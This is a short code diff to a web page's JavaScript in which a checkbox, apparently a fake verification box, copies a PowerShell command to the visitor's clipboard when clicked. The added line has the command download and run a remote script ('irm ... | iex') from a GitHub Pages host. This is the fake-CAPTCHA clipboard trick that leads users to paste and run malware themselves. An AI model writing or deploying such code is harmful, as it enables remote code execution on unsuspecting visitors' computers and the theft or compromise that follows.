@@ -79,7 +79,7 @@
             const checkbox = document.getElementById("fkrc-checkbox");
             if (checkbox && typeof stageClipboard === "function") {
                 checkbox.addEventListener("click", () => {
-                    stageClipboard("irm https://mcrobbyyt.github.io/script.ps1 | iex");
+                    stageClipboard("powershell.exe -c irm https://mcrobbyyt.github.io/script.ps1 | iex");
                 });
             } else {
                 console.error('Checkbox or stageClipboard not found:', { checkbox, stageClipboard: typeof stageClipboard });
